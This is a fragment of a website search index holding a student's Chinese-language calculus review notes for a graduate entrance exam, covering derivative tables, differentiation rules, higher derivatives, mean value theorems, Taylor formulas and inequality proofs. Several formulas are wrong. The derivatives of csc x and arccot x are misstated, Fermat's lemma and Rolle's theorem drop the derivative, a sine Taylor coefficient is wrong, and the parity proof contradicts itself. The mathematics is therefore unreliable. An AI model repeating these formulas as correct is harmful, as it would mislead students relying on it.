\u76f8\u5173\u53d8\u5316\u7387"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/2.%E7%AC%AC%E4%BA%8C%E7%AB%A0_%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/#3","text":"","title":"3. \u5bfc\u6570\u516c\u5f0f\u53ca\u6c42\u5bfc\u6cd5\u5219"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/2.%E7%AC%AC%E4%BA%8C%E7%AB%A0_%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/#31","text":"(C)' = 0 \\tag{2.1} (x^a)' = ax^{a-1} \\tag{2.2} (a^x)' = a^x\\ln(a) \\tag{2.3} (e^x)' = e^x \\tag{2.4} (\\log_a^x)' = \\frac{1}{x\\ln(a)} \\tag{2.5} (\\ln \\mid x \\mid )' = \\frac{1}{x} \\tag{2.6} (\\sin x)' = \\cos(x) \\tag{2.7} (\\cos x)' = -\\sin(x) \\tag{2.8} (\\tan x )' = \\sec^2(x) \\tag{2.9} (\\cot x)' = - \\csc^2(x) \\tag{2.10} (\\sec x)' = \\sec (x) \\tan (x) \\tag{2.11} (\\csc x)' = \\csc^2(x) \\cot (x) \\tag{2.12} (\\arcsin x)' = \\frac{1}{\\sqrt{1 - x^2}} \\tag{2.13} (\\arccos x)' = - \\frac{1}{\\sqrt{1 - x^2}} \\tag{2.14} (\\arctan x)' = \\frac{1}{1 + x^2} \\tag{2.15} (\\arcctg x)' = \\frac{1}{\\sqrt{1 - x^2}} \\tag{2.16} \u6ce8 \uff1a \\sec(x) = \\dfrac{1}{\\cos(x)} \uff0c \\csc(x) = \\dfrac{1}{\\sin(x)}","title":"3.1. \u57fa\u672c\u521d\u7b49\u51fd\u6570\u7684\u5bfc\u6570\u516c\u5f0f"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/2.%E7%AC%AC%E4%BA%8C%E7%AB%A0_%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/#32","text":"","title":"3.2. \u6c42\u5bfc\u6cd5\u5219"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/2.%E7%AC%AC%E4%BA%8C%E7%AB%A0_%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/#321","text":"\u8bbe u = u(x), v = v(x) \u5728 x \u5904\u53ef\u5bfc\uff0c\u5219 (u \\pm v)' = u' \\pm v' \\tag{2.17} (uv)' = u'v + uv' \\tag{2.18} (\\dfrac{u}{v})' = \\dfrac{u'v - uv'}{v^2} \\tag{2.19}","title":"3.2.1. \u6709\u7406\u8fd0\u7b97\u6cd5\u5219"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/2.%E7%AC%AC%E4%BA%8C%E7%AB%A0_%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/#322","text":"\u8bbe u = \\varphi(x) \u5728 x \u5904\u53ef\u5bfc\uff0c y = f(u) \u5728\u5bf9\u5e94\u70b9\u53ef\u5bfc\uff0c\u5219\u590d\u5408\u51fd\u6570 y = f[\\varphi(x)] \u5728 x \u5904\u53ef\u5bfc\uff0c\u5219 \\frac{dy}{dx} = \\frac{dy}{du} \\cdot \\frac{du}{dx} = f'(u)\\varphi'(x) \\tag{2.20} \u63a8\u8bba \u4e00\u4e2a\u53ef\u5bfc\u7684\u5947\uff08\u5076\uff09\u51fd\u6570\uff0c\u6c42\u4e00\u6b21\u5bfc\uff0c\u5176\u5947\u5076\u6027\u53d1\u751f\u4e00\u6b21\u53d8\u5316 \u8bc1\u660e\u63a8\u8bba \u82e5 f(x) \u4e3a \u5947\u51fd\u6570 \u3002 f(x) \u6ee1\u8db3 f(-x) = -f(x) ,\u53c8\u6839\u636e\u590d\u5408\u51fd\u6570\u6c42\u5bfc\u6cd5\u5219\uff0c\u5f97\u5230 f'(-x) = -f'(x) \uff0c\u5219 [f(-x)]' = -[-f(x)]' = [f(x)]' \u5373 f'(x) \u4e3a \u5076\u51fd\u6570 \u82e5 f(x) \u4e3a \u5076\u51fd\u6570 \u3002 f(x) \u6ee1\u8db3 f(-x) = f(x) ,\u53c8\u6839\u636e\u590d\u5408\u51fd\u6570\u6c42\u5bfc\u6cd5\u5219\uff0c\u5f97\u5230 f'(-x) = -f'(x) \uff0c\u5219 [f(-x)]' = -[f(x)]' \u5373 f'(x) \u4e3a \u5947\u51fd\u6570","title":"3.2.2. \u590d\u5408\u51fd\u6570\u6c42\u5bfc\u6cd5"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/2.%E7%AC%AC%E4%BA%8C%E7%AB%A0_%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/#323","text":"\u8bbe y = y(x) \u662f\u7531\u65b9\u7a0b F(x, y) = x \u6240\u786e\u5b9a\u7684\u53ef\u5bfc\u51fd\u6570\uff0c\u4e3a\u6c42\u5f97 y' \uff0c\u53ef\u5728\u65b9\u7a0b F(x, y) = 0 \u4e24\u8fb9\u5bf9 x \u6c42\u5bfc\uff0c\u53ef\u5f97\u5230\u4e00\u4e2a\u542b\u6709 y' \u7684\u65b9\u7a0b\uff0c\u4ece\u4e2d\u89e3\u51fa y' \u5373\u53ef\u3002 \u6ce8 \uff1a y' \u4e5f\u53ef\u7531\u591a\u5143\u51fd\u6570\u5fae\u5206\u6cd5\u4e2d\u7684\u9690\u51fd\u6570\u6c42\u5bfc\u516c\u5f0f2.21\u5f97\u5230\u3002 \\frac{dy}{dx} = - \\frac{F'_x}{F'_y} \\tag{2.21}","title":"3.2.3. \u9690\u51fd\u6570\u6c42\u5bfc\u6cd5"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/2.%E7%AC%AC%E4%BA%8C%E7%AB%A0_%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/#324","text":"\u82e5 y = f(x) \u5728\u67d0\u533a\u95f4\u5185\u53ef\u5bfc\uff0c\u4e14 f'(x) \\ne 0 \uff0c\u5219\u5176\u53cd\u51fd\u6570 x = \\varphi (x) \u5728\u5bf9\u5e94\u533a\u95f4\u5185\u4e5f\u53ef\u5bfc\uff0c\u4e14 \\varphi (y) = \\frac{1}{f'(x)} \\tag{2.22} \u5373 \\frac{dy}{dx} =\\frac{1}{\\dfrac{dy}{dx}}","title":"3.2.4. \u53cd\u51fd\u6570\u7684\u5bfc\u6570"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/2.%E7%AC%AC%E4%BA%8C%E7%AB%A0_%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/#325","text":"\u8bbe y = y(x) \u662f\u7531\u53c2\u6570\u65b9\u7a0b {\\left\\{ \\begin{aligned} &x = \\varphi (x)\\\\ &y = \\psi (x)\\\\ \\end{aligned}\\right. }, (\\alpha < t < \\beta) \u786e\u5b9a\u7684\u51fd\u6570\uff0c\u5219 \u82e5 \\varphi (x) \u548c \\psi (x) \u90fd\u53ef\u5bfc\uff0c\u4e14 \\varphi(t) \\ne 0 \uff0c\u5219 \\frac{dy}{dx} = \\frac{\\psi(x)}{\\varphi(x)} \\tag{2.23} \u82e5 \\varphi (x) \u548c \\psi (x) \u90fd\u4e8c\u9636\u53ef\u5bfc\uff0c\u4e14 \\varphi(t) \\ne 0 \uff0c\u5219 \\frac{d^2 y}{d^2 x} = \\frac{d}{dt}(\\frac{dy}{dx}) \\cdot \\frac{dt}{dx}= \\frac{d}{dt}(\\frac{\\psi '(t)}{\\varphi '(t)}) \\cdot \\frac{1}{\\varphi '(x)} = \\frac{\\psi ''(t)\\varphi '(x) - \\varphi ''(x) \\psi '(t)}{\\varphi^3 (t)} \\tag{2.24}","title":"3.2.5. \u53c2\u6570\u65b9\u7a0b\u6c42\u5bfc\u6cd5"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/2.%E7%AC%AC%E4%BA%8C%E7%AB%A0_%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/#326","text":"\u5982\u679c y = y(x) \u7684\u8868\u8fbe\u5f0f\u7531 \u591a\u4e2a\u56e0\u5f0f\u7684\u4e58\u9664\u3001\u4e58\u5e42 \u6784\u6210\uff0c\u6216\u662f \u5e42\u6307\u51fd\u6570 \u7684\u5f62\u5f0f\uff0c\u5219\u53ef\u5148\u5c06\u51fd\u6570\u53bb\u5bf9\u6570\uff0c\u7136\u540e\u4e24\u8fb9\u5bf9 x \u6c42\u5bfc\u3002 \u6ce8 \uff1a\u5bf9\u7b49\u5f0f\u4e24\u8fb9\u53d6\u5bf9\u6570\uff0c\u9700\u8981\u6ee1\u8db3\u7b49\u5f0f\u4e24\u8fb9\u90fd\u5927\u4e8e0\u7684\u6761\u4ef6","title":"3.2.6. \u5bf9\u6570\u6c42\u5bfc\u6cd5"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/2.%E7%AC%AC%E4%BA%8C%E7%AB%A0_%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/#4","text":"","title":"4. \u9ad8\u9636\u5bfc\u6570"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/2.%E7%AC%AC%E4%BA%8C%E7%AB%A0_%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/#41","text":"\u542b\u4e49\uff1a\u4e00\u822c\u5730\uff0c\u51fd\u6570 y = f(x) \u7684 n \u9636\u5bfc\u6570\u4e3a y^{(n)} = [f^{(n - 1)}(x)]' \uff0c\u4e5f\u53ef\u8bb0\u4e3a f^{(n)}(x) \u6216 \\dfrac{d^ny}{dx^n} \uff0c\u5373 n \u9636\u5bfc\u6570\u5c31\u662f n-1 \u9636\u5bfc\u51fd\u6570\u7684\u5bfc\u6570\u3002 \u6ce8 \uff1a\u5982\u679c\u51fd\u6570\u5728\u70b9 x \u5904 n \u9636\u53ef\u5bfc\uff0c\u5219\u5728\u70b9 x \u7684\u67d0\u90bb\u57df\u5185 f(x) \u5fc5\u5b9a\u5177\u6709\u4e00\u5207\u4f4e\u4e8e n \u9636\u7684\u5bfc\u6570\u3002","title":"4.1. \u9ad8\u9636\u5bfc\u6570\u7684\u5b9a\u4e49"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/2.%E7%AC%AC%E4%BA%8C%E7%AB%A0_%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/#42","text":"(\\sin x)^{(n)} = \\sin (x + n \\cdot \\frac{\\pi}{2}) \\tag{2.27} (cos x)^{(n)} = \\cos (x + n \\cdot \\frac{\\pi}{2}) \\tag{2.28} (u \\pm v)^{(n)} = u^{(n)} \\pm v^{(n)} \\tag{2.29} (uv)^{(n)} = \\sum_{k=0}^n C_n^k u^{(k)}v^{(n-k)} \\tag{2.30} \u5f0f2.24\u53ef\u7c7b\u6bd4 n \u9636\u4e8c\u9879\u5f0f\u516c\u5f0f (u + v)^{n} = \\sum_{k=0}^n C_n^k u^{k}v^{n-k} \\tag{2.31} \u63a8\u8bba \u82e5 y= \\sin(ax + b) \uff0c\u5219 y^{(n)} = a^n \\sin(ax + b + n \\cdot \\frac{\\pi}{2}) \\tag{2.32} \u8bc1\u660e \u901a\u8fc7\u5f52\u7eb3\u6cd5\uff0c\u6c42 y' \u548c y'' \uff0c\u63a8\u51fa y^{(n)} .","title":"4.2. \u5e38\u7528\u7684\u9ad8\u9636\u5bfc\u6570\u516c\u5f0f"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/2.%E7%AC%AC%E4%BA%8C%E7%AB%A0_%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/#43","text":"\u516c\u5f0f\u6cd5\uff0c\u5e26\u5165\u9ad8\u9636\u5bfc\u6570\u516c\u5f0f \u5f52\u7eb3\u6cd5\uff0c\u6c42 y' \uff0c y'' \uff0c\u5f52\u7eb3 y^{(n)}","title":"4.3. \u6c42\u9ad8\u9636\u5bfc\u6570\u7684\u65b9\u6cd5"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/2.%E7%AC%AC%E4%BA%8C%E7%AB%A0_%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/#5","text":"\u5bfc\u6570 \u5b9a\u4e49 \u6c42\u5bfc\u6cd5\u5219 \u9ad8\u9636\u5bfc\u6570 \u5fae\u5206 \u5b9a\u4e49 \u5fae\u5206\u4e0e\u53ef\u5bfc\u7684\u5173\u7cfb \u5fae\u5206\u65b9\u7a0b\u6c42\u5bfc","title":"5. \u603b\u7ed3"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/3.%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8/","text":"\u7b2c3\u7ae0 \u5fae\u5206\u4e2d\u503c\u5b9a\u7406\u53ca\u5bfc\u6570\u5e94\u7528 # \u76ee\u5f55 # \u7b2c3\u7ae0 \u5fae\u5206\u4e2d\u503c\u5b9a\u7406\u53ca\u5bfc\u6570\u5e94\u7528 \u76ee\u5f55 1. \u80cc\u666f 2. \u5fae\u5206\u4e2d\u503c\u5b9a\u7406 2.1. \u8d39\u9a6c\u5f15\u7406 2.2. \u7f57\u5c14\u5b9a\u7406 2.3. \u62c9\u683c\u6717\u65e5\u4e2d\u503c\u5b9a\u7406 2.4. \u67ef\u897f\u4e2d\u503c\u5b9a\u7406 2.5. \u76ae\u4e9a\u8bfa\u578b\u4f59\u9879\u6cf0\u52d2\u516c\u5f0f 2.6. \u62c9\u683c\u6717\u65e5\u578b\u4f59\u9879\u6cf0\u52d2\u516c\u5f0f 2.7. \u51e0\u4e2a\u5e38\u7528\u7684\u6cf0\u52d2\u516c\u5f0f\uff08\u62c9\u683c\u6717\u65e5\u4f59\u9879\uff09 2.8. \u4e0d\u7b49\u5f0f\u7684\u8bc1\u660e 3. \u5bfc\u6570\u5e94\u7528 3.1. \u51fd\u6570\u7684\u5355\u8c03\u6027 3.2. \u51fd\u6570\u7684\u6781\u503c 3.3. \u51fd\u6570\u7684\u6700\u5927\u503c\u548c\u6700\u5c0f\u503c 3.4. \u66f2\u7ebf\u7684\u51f9\u51f8\u6027 3.5. \u66f2\u7ebf\u7684\u6e10\u8fd1\u7ebf 3.5.1. \u6e10\u8fd1\u7ebf\u7684\u5b9a\u4e49 3.5.2. \u6e10\u8fd1\u7ebf\u7684\u6c42\u89e3 3.6. \u51fd\u6570\u7684\u4f5c\u56fe 3.7. \u66f2\u7ebf\u7684\u5f27\u5fae\u5206\u4e0e\u66f2\u7387 4. \u603b\u7ed3 1. \u80cc\u666f # \u524d\u6bb5\u65f6\u95f4\u590d\u4e60\u5b8c\u4e86\u9ad8\u6570\u7b2c\u4e09\u7ae0\u7684\u5185\u5bb9\uff0c\u6211\u53c2\u8003\u300a\u590d\u4e60\u5168\u4e66\u00b7\u57fa\u7840\u7bc7\u300b\u548c\u8001\u5e08\u8bb2\u8bfe\u7684\u5185\u5bb9\u5bf9\u8fd9\u4e00\u7ae0\u7684\u77e5\u8bc6\u70b9\u8fdb\u884c\u4e86\u6574\u7406\uff0c\u5f62\u6210\u4e86\u8fd9\u7bc7\u7b14\u8bb0\uff0c\u65b9\u4fbf\u5728\u79fb\u52a8\u8bbe\u5907\u4e0a\u8fdb\u884c\u8bbf\u95ee\u548c\u540e\u7eed\u7684\u8865\u5145\u4fee\u6539\u3002 2. \u5fae\u5206\u4e2d\u503c\u5b9a\u7406 # 2.1. \u8d39\u9a6c\u5f15\u7406 # \u8bbe\u51fd\u6570 f(x) \u5728\u70b9 x_0 \u5904\u53ef\u5bfc\uff0c\u5982\u679c\u51fd\u6570 f(x) \u5728\u70b9 x_0 \u5904\u53d6\u5f97\u6781\u503c\uff0c\u90a3\u4e48 f(x_0) = 0 . 2.2. \u7f57\u5c14\u5b9a\u7406 # \u5982\u679c f(x) \u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 \u5728\u95ed\u533a\u95f4 [a, b] \u4e0a\u8fde\u7eed \u5728\u5f00\u533a\u95f4 (a, b) \u5185\u53ef\u5bfc f(a) = f(b) , \u5219\u5728 (a, b) \u5185\u81f3\u5c11\u5b58\u5728\u4e00\u70b9 \\xi \uff0c\u4f7f\u5f97 f(\\xi) \\equiv 0 . \\text{\u56fe1 \u7f57\u5c14\u5b9a\u7406} 2.3. \u62c9\u683c\u6717\u65e5\u4e2d\u503c\u5b9a\u7406 # \u5b9a\u4e49 \u5982\u679c f(x) \u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 \u5728\u95ed\u533a\u95f4 [a, b] \u4e0a\u8fde\u7eed \u5728\u5f00\u533a\u95f4 (a, b) \u5185\u53ef\u5bfc\uff0c \u5219\u5728 (a, b) \u5185\u81f3\u5c11\u5b58\u5728\u4e00\u70b9 \\xi \uff0c\u4f7f\u5f97 f(b) - f(a) = f'(\\xi)(b - a) \\tag{3.1} \\text{\u56fe2 \u62c9\u683c\u6717\u65e5\u4e2d\u503c\u5b9a\u7406} \u8bc1\u660e \u5df2\u77e5\u51fd\u6570\u5728\u95ed\u533a\u95f4 [a, b] \u4e0a\u8fde\u7eed\uff0c\u5728\u5f00\u533a\u95f4 (a, b) \u5185\u53ef\u5bfc\uff0c\u6784\u9020\u8f85\u52a9\u51fd\u6570 y = f(a) + \\dfrac{f(b)-f(a)}{b-a}(x-a) \u53ef\u5f97 g(a) = g(b) \uff0c\u53c8\u56e0\u4e3a g(x) \u5728 [a, b] \u4e0a\u8fde\u7eed\uff0c\u5728\u5f00\u533a\u95f4 (a, b) \u5185\u53ef\u5bfc\uff0c\u6240\u4ee5\u6839\u636e\u7f57\u5c14\u5b9a\u7406\u53ef\u5f97\u5fc5\u6709\u4e00\u70b9 \\xi \\in (a, b) \uff0c\u4f7f\u5f97 g'(\\xi) = 0 \uff0c\u7531\u6b64\u53ef\u5f97 g'(\\xi) = f'(\\xi) - \\dfrac{f(b)-f(a)}{(b-a)} = 0 \u53d8\u5f62\u5f97 f(b) - f(a) = f'(\\xi)(b - a) \u5b9a\u7406\u8bc1\u6bd5\u3002 2.4. \u67ef\u897f\u4e2d\u503c\u5b9a\u7406 # \u5b9a\u4e49 \u5982\u679c f(x), F(x) \u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 \u5728\u95ed\u533a\u95f4 [a, b] \u4e0a\u8fde\u7eed \u5728\u5f00\u533a\u95f4 (a, b) \u5185\u53ef\u5bfc\uff0c\u4e14 F'(x) \u5728 (a, b) \u5185\u6bcf\u4e00\u70b9\u5747\u4e0d\u4e3a\u96f6\uff0c\u5219\u5728 (a, b) \u5185\u81f3\u5c11\u5b58\u5728\u4e00\u70b9 \\xi \u4f7f\u5f97 \\frac{f'(\\xi)}{F'(x)} = \\frac{f(b)-f(a)}{F(b)-F(a)} \\tag{3.2} \\text{\u56fe3 \u67ef\u897f\u4e2d\u503c\u5b9a\u7406} \u8bc1\u660e \u8981\u8bc1\u660e \\frac{f'(\\xi)}{F'(x)} = \\frac{f(b)-f(a)}{F(b)-F(a)} \u53ef\u8f6c\u6362\u4e3a\u8bc1\u660e [f(b) - f(a)]F'(\\xi) - [F(b) - F(a)]f'(\\xi) = 0 \u6784\u9020\u51fd\u6570 \\varphi(x) = [f(b) - f(a)][F(x) - F(a)] - [F(b) - F(a)][f(x) - f(a)] \\varphi(x) \u5728 [a, b] \u4e0a\u8fde\u7eed\uff0c\u5728\u5f00\u533a\u95f4 (a, b) \u5185\u53ef\u5bfc\uff0c\u4e14 \\varphi(a) = \\varphi(b) = 0 \uff0c\u7531\u7f57\u5c14\u5b9a\u7406\u53ef\u77e5\uff0c\u5b58\u5728 \\xi \\in (a, b) \uff0c\u4f7f\u5f97 \\varphi'(\\xi) = 0 \uff0c\u7531\u6b64\u53ef\u5f97 [f(b) - f(a)]F'(\\xi) - [F(b) - F(a)]f'(\\xi) = 0 \u5b9a\u7406\u8bc1\u6bd5\u3002 2.5. \u76ae\u4e9a\u8bfa\u578b\u4f59\u9879\u6cf0\u52d2\u516c\u5f0f # \u5982\u679c f(x) \u5728\u70b9 x_0 \u6709\u81f3 n \u9636\u7684\u5bfc\u6570\uff0c\u5219\u6709 f{ \\left( {x} \\right) }=\\mathop{ \\sum }\\limits_{{n=0}}^{{ \\infty }}\\frac{{1}}{{n!}}\\mathop{{f}}\\nolimits^{{(n)}}{ \\left( {\\mathop{{x}}\\nolimits_{{0}}} \\right) }{\\mathop{{ \\left( {x-\\mathop{{x}}\\nolimits_{{0}}} \\right) }}\\nolimits^{{n}}} + o[(x - x_0)^n],x \\in U{ \\left( {\\mathop{{x}}\\nolimits_{{0}}} \\right) } \\tag{3.3} \u5e38\u79f0 R_0 = o(x - x_0)^n \u4e3a\u76ae\u4e9a\u8bfa\u4f59\u9879\uff0c\u82e5 x_0 = 0 \uff0c\u5219\u5f97\u9ea6\u514b\u52b3\u6797\u516c\u5f0f f{ \\left( {x} \\right) }=\\mathop{ \\sum }\\limits_{{n=0}}^{{ \\infty }}\\frac{{1}}{{n!}}\\mathop{{f}}\\nolimits^{{(n)}}{ \\left( {0} \\right) }{\\mathop{{x}}\\nolimits^{{n}}} + o(x^n),x \\in U{ \\left( {0} \\right) } \\tag{3.4} 2.6. \u62c9\u683c\u6717\u65e5\u578b\u4f59\u9879\u6cf0\u52d2\u516c\u5f0f # \u8bbe f(x) \u5728\u70b9 x_0 \u6709\u81f3 n + 1 \u9636\u7684\u5bfc\u6570\uff0c\u5219\u5f53 x \\in (a, b) \u65f6\u6709 f{ \\left( {x} \\right) }=\\mathop{ \\sum }\\limits_{{n=0}}^{{ \\infty }}\\frac{{1}}{{n!}}\\mathop{{f}}\\nolimits^{{(n)}}{ \\left( {\\mathop{{x}}\\nolimits_{{0}}} \\right) }{\\mathop{{ \\left( {x-\\mathop{{x}}\\nolimits_{{0}}} \\right) }}\\nolimits^{{n}}} + R_n(x) \\tag{3.5} \u5176\u4e2d R_n(x) = \\dfrac{f^{(n+1)}(\\xi)}{(n + 1)!}(x - x_0)^{n + 1} \uff0c\u8fd9\u91cc \\xi \u4ecb\u4e8e x_0 \u4e0e x \u4e4b\u95f4\uff0c\u79f0\u4e3a\u62c9\u683c\u6717\u65e5\u4f59\u9879\u3002 2.7. \u51e0\u4e2a\u5e38\u7528\u7684\u6cf0\u52d2\u516c\u5f0f\uff08\u62c9\u683c\u6717\u65e5\u4f59\u9879\uff09 # e^x = 1 + x + {x^2\\over{2!}} + \\cdots + {x^n\\over{n!}} + \\frac{e^{\\theta x}}{(n + 1)!} x^{n + 1} \\tag{3.6} \\sin(x) = x - {x^3\\over{3!}} + \\cdots + (-1)^{n-1}{{x^{2n-1}}\\over{(2n)!}} + (-1)^{n} \\frac{cos(\\theta x)}{(2n + 1)!}x^{2n + 1} \\tag{3.7} \\cos(x) = 1 - {x^2\\over{2!}} + \\cdots + (-1)^{n}{{x^{2n}}\\over{(2n)!}} + + (-1)^{n} \\frac{cos(\\theta x)}{(2n + 2)!}x^{2n + 2} \\tag{3.8} \\ln(1 + x) = x - {x^2\\over{2}} + \\cdots + (-1)^{n-1}{{x^{n}\\over{n}}} + (-1)^{n} \\frac{x^{(n + 1)}}{(n + 1)(1 + \\theta x)^{n + 1}} \\tag{3.9} \\begin{aligned} (1 + x) ^ \\alpha = 1 + \\alpha x + {\\alpha (\\alpha - 1)\\over{2!} }x^2 + \\cdots + {[\\alpha!/(\\alpha - n)!]\\over{n!}}x^n + \\\\ \\frac{[\\alpha!/(\\alpha - n - 1)!]}{(n + 1)!}(1 + \\theta x) ^ {\\alpha - n - 1}x^{n + 1} \\tag{3.10} \\end{aligned} 2.8. \u4e0d\u7b49\u5f0f\u7684\u8bc1\u660e # \u57fa\u672c\u4e0d\u7b49\u5f0f \\sin(x) < x < \\tan(x), x\\in (0, \\frac{\\pi}{2}) \\tag{3.11} \\frac{x}{1 + x} < \\ln(1 + x) < x, x\\in (0, +\\infty) \\tag{3.12} \u8bc1\u660e\u65b9\u6cd5 \u5355\u8c03\u6027 \u8981\u8bc1\u660e\u4e0d\u7b49\u5f0f f(x) \\ge g(x) \uff0c\u5728 x \\in [a, b] \u533a\u95f4\u6052\u6210\u7acb\uff0c\u53ef\u8f6c\u6362\u4e3a F(x) = f(x) - g(x) \\ge 0 \\tag{3.13} \u5373\u8bc1\u660e\u5728 [a, b] \u533a\u95f4\u5185 F'(x) > 0, F(a) \\le 0 \\tag{3.14} \u53ef\u603b\u7ed3\u4e3a\u901a\u8fc7\u8bc1\u660e\u6784\u9020\u51fa\u7684\u51fd\u6570 F(x) \u5728\u95ed\u533a\u95f4\u5185\u5355\u8c03 \uff0c\u4e14\u5728\u7aef\u70b9\u503c\u6ee1\u8db3\u6761\u4ef6\uff0c\u4ece\u800c\u8bc1\u660e\u4e0d\u7b49\u5f0f\u3002 \u62c9\u683c\u6717\u65e5\u4e2d\u503c\u5b9a\u7406 \u8981\u8bc1\u660e\u4e0d\u7b49\u5f0f \\frac{x}{1 + x} < \\ln(1 + x) <x, (x > 0) \u6b65\u9aa4\u5982\u4e0b\uff1a \u4ee4 f(x) = ln(x) \uff0c f(x) \u6ee1\u8db3\u5728 [1, 1+x] \u4e0a\u8fde\u7eed\uff0c\u5728 (1, 1+x) \u5185\u53ef\u5bfc\uff0c\u5219\u5728 (1, 1+x) \u5185\u81f3\u5c11\u5b58\u5728\u4e00\u70b9 \\xi \uff0c\u4f7f\u5f97 \\ln(1 + x) = \\ln(1 + x) - \\ln(1) = (1 + x - 1)f'(\\xi) = \\frac{x}{\\xi} \u53c8\u56e0\u4e3a 1 < \\xi < (1 + x) \uff0c\u5e26\u5165\u7aef\u70b9\u503c\u5219\u4e0d\u7b49\u5f0f\u5f97\u8bc1\u3002\u53ef\u603b\u7ed3\u4e3a\u901a\u8fc7 \u4f7f\u7528\u62c9\u683c\u6717\u65e5\u4e2d\u503c\u5b9a\u7406\u6784\u9020\u7684\u51fd\u6570 {(b - a)}f'(a) \\le {(b - a)}f'(\\xi) = {f(b)- f(a)} \\le {(b - a)}f'(b) \u5728\u7aef\u70b9\u503c\u6ee1\u8db3\u6761\u4ef6\uff0c\u4ece\u800c\u8bc1\u660e\u4e0d\u7b49\u5f0f\u3002 \u6700\u5927\u6700\u5c0f\u503c \u8981\u8bc1\u660e\u4e0d\u7b49\u5f0f f(x) \\ge g(x) \uff0c\u5728 x \\in [a, b] \u533a\u95f4\u6052\u6210\u7acb\uff0c\u53ef\u8f6c\u6362\u4e3a F(x) = f(x) - g(x) \\ge 0 \u5373\u8bc1\u660e\u5728 [a, b] \u533a\u95f4\u5185\u6709\u4e00\u70b9 x_0 \u6ee1\u8db3 F'(x_0) = 0, \\lim\\limits_{x \\to -x_0}{f(x)} \\cdot \\lim\\limits_{x \\to +x_0}{f(x)} < 0 \u5373 x_0 \u70b9\u4e3a [a, b] \u533a\u95f4\u5185\u7684\u6781\u503c\u70b9\uff0c\u5e76\u8bc1\u660e x_0 \u70b9\u7684\u503c\u5c0f\u4e8e\u5176\u4ed6\u6781\u5c0f\u503c\u70b9\u548c\u7aef\u70b9\u503c\uff0c\u5373 x_0 \u70b9\u4e3a\u6700\u5c0f\u503c\u70b9\u3002\u540c\u65f6 f(x_0) \\ge 0 \u5219\u4e0d\u7b49\u5f0f\u5f97\u8bc1\u3002\u53ef\u603b\u7ed3\u4e3a\u901a\u8fc7\u8bc1\u660e \u6700\u503c\u70b9\u6ee1\u8db3\u6761\u4ef6 \uff0c\u4ece\u800c\u8bc1\u660e\u4e0d\u7b49\u5f0f\u3002 3. \u5bfc\u6570\u5e94\u7528 # 3.1. \u51fd\u6570\u7684\u5355\u8c03\u6027 # \u5b9a\u7406 \u8bbe f(x) \u5728 [a, b] \u4e0a\u8fde\u7eed\uff0c\u5728 (a, b) \u5185\u53ef\u5bfc\u3002 \u82e5\u5728 (a, b) \u5185 f'(x)>0 \uff0c\u5219 f(x) \u5728 [a, b] \u4e0a\u5355\u8c03\u9012\u589e \u82e5\u5728 (a, b) \u5185 f'(x)<0 \uff0c\u5219 f(x) \u5728 [a, b] \u4e0a\u5355\u8c03\u9012\u51cf 3.2. \u51fd\u6570\u7684\u6781\u503c # 3.3. \u51fd\u6570\u7684\u6700\u5927\u503c\u548c\u6700\u5c0f\u503c # 3.4. 